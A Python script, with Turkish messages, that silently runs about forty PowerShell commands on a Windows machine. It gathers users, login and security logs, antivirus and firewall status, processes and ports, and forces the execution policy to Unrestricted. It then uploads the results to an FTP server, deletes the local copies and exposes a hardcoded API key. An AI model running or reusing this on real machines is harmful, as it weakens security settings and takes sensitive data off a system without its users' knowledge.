import subprocess
import os
import shutil
import codecs
import requests
import json
from ftplib import FTP
from datetime import datetime

def get_ip():
    api_url = "https://api.ipdata.co/?api-key=26737ac98ed9d6b6bdb53ee9c7decedc21e63b498ae05080370f59fb"
    response = requests.get(api_url)
    data = response.json()
    return data["ip"]

public_ip = get_ip()
time = datetime.now()

def load_ftp_password():
    try:
        with open('FTP.key', 'r') as file:
            return file.read().strip()
    except Exception as e:
        print(f"Error loading FTP password: {e}")
        return None

def save_dxdiag_output(output_file):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    temp_dir = r'C:\Windows\Temp\DLL'
    output_path = os.path.join(temp_dir, output_file)
    
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir, exist_ok=True)
    
    subprocess.run(['dxdiag', '/t', output_path], check=True)

def run_powershell_command(command):
    result = subprocess.run(
        ["powershell", "-Command", command],
        capture_output=True, text=True, encoding='utf-8', errors='replace',
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    return result.stdout, result.stderr

def detect_encoding(data):
    encodings = [
        'utf-8', 'utf-16', 'utf-32', 'latin-1', 'windows-1252',
        'iso-8859-1', 'iso-8859-2', 'iso-8859-5',
        'iso-8859-15', 'mac_roman', 'shift_jis',
        'euc-jp', 'big5', 'cp932', 'koi8-r',
        'ansi'
    ]
    
    for encoding in encodings:
        try:
            data.decode(encoding)
            return encoding
        except (UnicodeDecodeError, TypeError):
            continue
    return 'utf-8'  # Fallback to 'utf-8' if no encoding is detected

def upload_to_ftp(server, port, username, password, local_path, remote_path):
    try:
        ftp = FTP()
        ftp.connect(server, port)
        ftp.login(username, password)
        
        # Change to the remote directory
        try:
            create_ftp_directory(ftp, remote_path)
        except Exception as e:
            print(f"Dizin oluşturulurken hata oluştu: {e}")
        
        for filename in os.listdir(local_path):
            local_file = os.path.join(local_path, filename)
            remote_file_path = os.path.join(remote_path, filename)
            with open(local_file, 'rb') as file:
                ftp.storbinary(f'STOR {remote_file_path}', file)
            print(f"{filename} dosyası FTP sunucusuna '{remote_file_path}' dizinine yüklendi.")
        
        ftp.quit()
    except Exception as e:
        print(f"FTP yükleme sırasında hata oluştu: {e}")

def create_ftp_directory(ftp, path):
    """ Create FTP directory recursively. """
    directories = path.strip('/').split('/')
    current_path = ''
    
    for directory in directories:
        current_path += '/' + directory
        try:
            ftp.mkd(current_path)
        except Exception as e:
            if str(e).startswith('550'):  # Directory already exists
                pass
            else:
                raise

def fetch_ip_data(api_key):
    url = f"https://api.ipdata.co?api-key={api_key}"
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise HTTPError for bad responses
        return response.json()
    except requests.RequestException as e:
        print(f"API isteği sırasında hata oluştu: {e}")
        return None

def save_ip_data(filename, data):
    if data:
        try:
            with open(filename, 'w', encoding='utf-8') as file:
                json.dump(data, file, indent=4)  # JSON verilerini düzgün bir formatta kaydet
            print(f"IP verisi '{filename}' dosyasına kaydedildi.")
        except Exception as e:
            print(f"Dosya yazılırken hata oluştu: {e}")

if __name__ == "__main__":
    temp_dir = r'C:\Windows\Temp\DLL'
    
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir, exist_ok=True)
    
    output_file = 'dxdiag.txt'
    save_dxdiag_output(output_file)
    print(f"dxdiag '{output_file}' dosyasına kaydedildi.")
    
    commands = {
        "security_import.txt": r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Import-Module Microsoft.PowerShell.Security"',
        "access.txt": r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force"',
        "system_info.txt": "Get-ComputerInfo",
        "os_info.txt": "Get-WmiObject -Class Win32_OperatingSystem",
        "hardware_info.txt": "Get-WmiObject -Class Win32_ComputerSystem",
        "cpu_info.txt": "Get-WmiObject -Class Win32_Processor",
        "memory_info.txt": "Get-WmiObject -Class Win32_PhysicalMemory",
        "network_adapters.txt": "Get-NetAdapter",
        "network_config.txt": "Get-NetIPAddress",
        "drive_info.txt": "Get-WmiObject -Class Win32_DiskDrive",
        "disk_partitions.txt": "Get-WmiObject -Class Win32_DiskPartition",
        "file_system.txt": "Get-Volume",
        "installed_software.txt": "Get-WmiObject -Class Win32_Product",
        "hotfixes.txt": "Get-HotFix",
        "ps_version.txt": "$PSVersionTable",
        "antivirus_status.txt": "Get-CimInstance -Namespace 'root\\SecurityCenter2' -ClassName AntiVirusProduct",
        "firewall_rules.txt": "Get-NetFirewallRule",
        "firewall_profiles.txt": "Get-NetFirewallProfile",
        "disk_encryption.txt": "Get-BitLockerVolume",
        "local_users.txt": "Get-LocalUser -Force",
        "local_groups.txt": "Get-LocalGroup",
        "local_group_members.txt": "Get-LocalGroupMember 'Administrators' -Confirm:$false -Force",
        "login_history.txt": "Get-EventLog -LogName Security -InstanceId 4624 -Newest 10",
        "system_logs.txt": "Get-EventLog -LogName System",
        "application_logs.txt": "Get-EventLog -LogName Application",
        "process.txt": "Get-Process | Select-Object Name, Id, @{Name='CPU';Expression={$_.CPU}}, @{Name='RAM';Expression={[math]::round($_.WorkingSet / 1MB, 2)}}, @{Name='UserName';Expression={(Get-WmiObject Win32_Process -Filter \"ProcessId='$($_.Id)'\" | Select-Object -ExpandProperty GetOwner).User}}, @{Name='Description';Expression={(Get-WmiObject Win32_Process -Filter \"ProcessId='$($_.Id)'\" | Select-Object -ExpandProperty Description)}}",
        "tcp_ports.txt": "Get-NetTCPConnection",
        "udp_ports.txt": "Get-NetUDPEndpoint",
        "net_adapters_statistics.txt": "Get-NetAdapterStatistics",
        "drivers.txt": "Get-WmiObject -Class Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer, DriverDate",
        "power_profiles.txt": "powercfg /l",
        "power_profiles_all.txt": "powercfg /query",
        "printers.txt": "Get-WmiObject -Class Win32_Printer | Select-Object Name, DriverName, PortName, SystemName",
        "local_shares.txt": "net share",
        "system_logs2.txt": "wevtutil qe System /rd:true /f:text",
        "application_logs2.txt": "wevtutil qe Application /rd:true /f:text",
        "security_logs.txt": "wevtutil qe Security /rd:true /f:text",
        "usb_devices.txt": "Get-WmiObject -Class Win32_USBControllerDevice | Select-Object Dependent",
        "network_statistics.txt": "netstat -e",
        "offline_files.txt": "Get-SmbClientConfiguration",
        "disk_usage.txt": "Get-Volume | Select-Object DriveLetter, FileSystem, @{Name='Size(GB)';Expression={[math]::round($_.Size/1GB,2)}}, @{Name='FreeSpace(GB)';Expression={[math]::round($_.SizeRemaining/1GB,2)}}"
    }
    
    for filename, cmd in commands.items():
        output_path = os.path.join(temp_dir, filename)
        output, error = run_powershell_command(cmd)
        
        if output is not None:
            # Encode output to bytes for encoding detection
            output_bytes = output.encode('utf-8', 'replace')
            encoding = detect_encoding(output_bytes)
            
            try:
                # Write the output to file with detected encoding
                with codecs.open(output_path, 'w', encoding=encoding) as file:
                    file.write(output)
                print(f"PowerShell komutu '{cmd}' çıkışı '{filename}' dosyasına '{encoding}' kodlamasıyla kaydedildi.")
            except Exception as e:
                print(f"Dosya yazılırken hata oluştu: {e}")
        if error:
            print(f"PowerShell komutu '{cmd}' için hata: {error}")
    
    # Kayıt defteri dallarını dışa aktarma komutları
    registry_exports = {
        "HKEY_CLASSES_ROOT.reg": 'reg export "HKEY_CLASSES_ROOT" "{}\\HKEY_CLASSES_ROOT.reg" /y'.format(temp_dir),
        "HKEY_CURRENT_USER.reg": 'reg export "HKEY_CURRENT_USER" "{}\\HKEY_CURRENT_USER.reg" /y'.format(temp_dir),
        "HKEY_LOCAL_MACHINE.reg": 'reg export "HKEY_LOCAL_MACHINE" "{}\\HKEY_LOCAL_MACHINE.reg" /y'.format(temp_dir),
        "HKEY_USERS.reg": 'reg export "HKEY_USERS" "{}\\HKEY_USERS.reg" /y'.format(temp_dir),
        "HKEY_CURRENT_CONFIG.reg": 'reg export "HKEY_CURRENT_CONFIG" "{}\\HKEY_CURRENT_CONFIG.reg" /y'.format(temp_dir)
    }
    
    api_key = "26737ac98ed9d6b6bdb53ee9c7decedc21e63b498ae05080370f59fb"
    # Fetch and save IP data
    ip_data = fetch_ip_data(api_key)
    save_ip_data(os.path.join(temp_dir, 'ipdata.txt'), ip_data)
    
    # FTP server details
    ftp_server = 'localhost'  # FTP server address
    ftp_port = 21  # FTP port number
    ftp_username = 'INFO'  # FTP username
    ftp_password = load_ftp_password()
    
    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M") 
    remote_dir = f'/{public_ip}/{current_time}'  # Format remote directory path

    if ftp_password:
        try:
            ftp = FTP(f'{ftp_server}')
            ftp.login(f'{ftp_username}', f'{ftp_password}')
            # Create remote directory
            create_ftp_directory(ftp, remote_dir)
            # Upload files
            upload_to_ftp(ftp_server, ftp_port, ftp_username, ftp_password, temp_dir, remote_dir)
        except Exception as e:
            print(f"FTP işlemleri sırasında hata oluştu: {e}")
        finally:
            ftp.quit()

    # Cleanup
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"{temp_dir} dizini silindi.")
